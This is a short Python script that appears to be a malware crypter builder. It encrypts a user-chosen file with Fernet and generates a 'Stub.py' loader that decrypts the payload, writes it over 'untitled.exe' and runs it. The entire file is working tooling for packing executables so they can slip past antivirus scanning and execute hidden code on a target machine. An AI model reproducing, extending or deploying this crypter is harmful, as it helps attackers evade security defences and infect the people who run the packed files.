from cryptography.fernet import Fernet
from tkinter.filedialog import askopenfilename


def main(origin_file):
    with open(origin_file, "rb")as file:
        origin_file_content = file.read()
    encrypted_text, key = encryption(origin_file_content)
    pseudo_text = """import os
from cryptography.fernet import Fernet


def main(key, text_to_decrypt):
    for x in os.listdir():
        if x == "untitled.exe":
            with open(x, "wb")as file:
                file.write(decryption(text_to_decrypt, key))
            os.startfile(x)
            break


def decryption(text_to_decrypt, key):
    method = Fernet(key)
    decrypt_text = method.decrypt(text_to_decrypt)
    return decrypt_text


key = {}
text_to_decrypt = {}
main(key, text_to_decrypt)
""".format(key, encrypted_text)
    with open("Stub.py", "w")as n:
        n.write(pseudo_text)


def encryption(origin_file_content):
    key = Fernet.generate_key()
    encrypt_method = Fernet(key)
    encrypted_text = encrypt_method.encrypt(origin_file_content)
    return encrypted_text, key


if __name__ == '__main__':
    f = askopenfilename()
    main(f)
